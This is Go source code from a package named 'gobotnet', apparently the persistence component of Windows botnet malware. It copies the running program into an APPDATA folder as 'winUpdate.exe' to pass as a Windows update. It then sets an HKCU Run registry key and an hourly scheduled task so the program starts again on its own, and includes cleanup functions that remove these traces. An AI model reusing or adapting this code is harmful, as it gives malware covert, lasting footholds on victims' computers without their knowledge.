package gobotnet

import (
	"fmt"
	"golang.org/x/sys/windows/registry"
	"os"
)

var (
	programName        string = "winUpdate"
	copyProgramDir     string = os.Getenv("APPDATA") + `\WindowsUpdate`
	copyExecFilePath   string = copyProgramDir + `\` + programName + ".exe"
	sourceExecFilePath string = os.Args[0]
)

func RegTest() {
	fmt.Println("RegTest")
	// var err error

	// err = os.MkdirAll(copyProgramDir, 0777)
	// fmt.Println(err)

	// err = RegisterAutoRun()
	// fmt.Println(err)

	// err = CopyFileToDirectory(sourceExecFilePath, copyExecFilePath)
	// fmt.Println(err)
}

func RegisterProgram() {
	err := CopyFileToDirectory(sourceExecFilePath, copyExecFilePath)
	OutMessage(err.Error())
	err = RegisterAutoRun()
	OutMessage(err.Error())
}

func UnRegisterProgram() {
	UnRegisterAutoRun()
	DeleteFile(sourceExecFilePath)
	DeleteFile(copyExecFilePath)
}

func RegisterAutoRun() error {
	err := WriteRegistryKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, programName, copyExecFilePath)
	return err
}

func IsRegisterAutoRun() error {
	err := IsValueSetRegistryKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, programName)
	return err
}

func UnRegisterAutoRun() {
	DeleteRegistryKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, programName)
}

func RegisterSchedule(nameTask string, pathToFile string) ([]byte, error) {
	return CmdExec("schtasks /create /f /tn " + nameTask + " /sc hourly /mo 1 /tr " + pathToFile)
}

func IsRegisterSchedule(nameTask string) ([]byte, error) {
	return CmdExec("schtasks /query /tn " + nameTask + "\"")
}

func UnRegisterSchedule(nameTask string) ([]byte, error) {
	return CmdExec("schtasks /delete /f /tn " + nameTask)
}
